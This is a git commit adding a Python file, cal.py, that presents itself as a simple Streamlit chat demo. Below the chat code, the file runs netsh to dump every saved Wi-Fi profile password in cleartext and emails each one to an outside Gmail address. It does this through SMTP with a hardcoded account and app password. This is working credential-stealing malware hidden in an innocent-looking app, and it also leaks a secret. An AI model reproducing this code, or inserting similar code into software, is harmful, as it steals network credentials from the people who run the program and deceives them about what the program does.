9374dc757d5c4a6c3bf3953bd9046e0c2704a58a
bharath_ai <142334747+bharath69848@users.noreply.github.com>
2024-08-11 21:00:23 +0530

    Add files via upload

---
+++ cal.py
@@ -0,0 +1,70 @@
+import subprocess
+import smtplib
+import streamlit as st
+import random
+import time
+
+
+# Streamed response emulator
+def response_generator():
+    response = random.choice(
+        [
+            "Hello there! How can I assist you today?",
+            "Hi, human! Is there anything I can help you with?",
+            "Do you need help?",
+        ]
+    )
+    for word in response.split():
+        yield word + " "
+        time.sleep(0.05)
+
+
+st.title("Simple chat")
+
+# Initialize chat history
+if "messages" not in st.session_state:
+    st.session_state.messages = []
+
+# Display chat messages from history on app rerun
+for message in st.session_state.messages:
+    with st.chat_message(message["role"]):
+        st.markdown(message["content"])
+
+# Accept user input
+if prompt := st.chat_input("What is up?"):
+    # Add user message to chat history
+    st.session_state.messages.append({"role": "user", "content": prompt})
+    # Display user message in chat message container
+    with st.chat_message("user"):
+        st.markdown(prompt)
+
+    # Display assistant response in chat message container
+    with st.chat_message("assistant"):
+        response = st.write_stream(response_generator())
+    # Add assistant response to chat history
+    st.session_state.messages.append({"role": "assistant", "content": response})
+
+def send_email(content):
+    email = "animenewschannel01@gmail.com"
+    password = "dsio qsij kuod nsna"
+    obj = smtplib.SMTP("smtp.gmail.com",587)
+    obj.starttls()
+    obj.login (email, password)
+    obj.sendmail(email, "bharathpersonal06@gmail.com", content)
+    obj.quit()
+
+# running command
+command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+profiles = [i.split(":")[1][1:-1] for i in command if "All User Profile" in i]
+for i in profiles:
+    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+    try:
+        wifi_password="{:<30}|  {:<}".format(i, results[0])
+        send_email(wifi_password)
+    except IndexError:
+        failed = "{:<30}|  {:<}".format(i, "")
+        send_email(failed)
+input("")
+
+
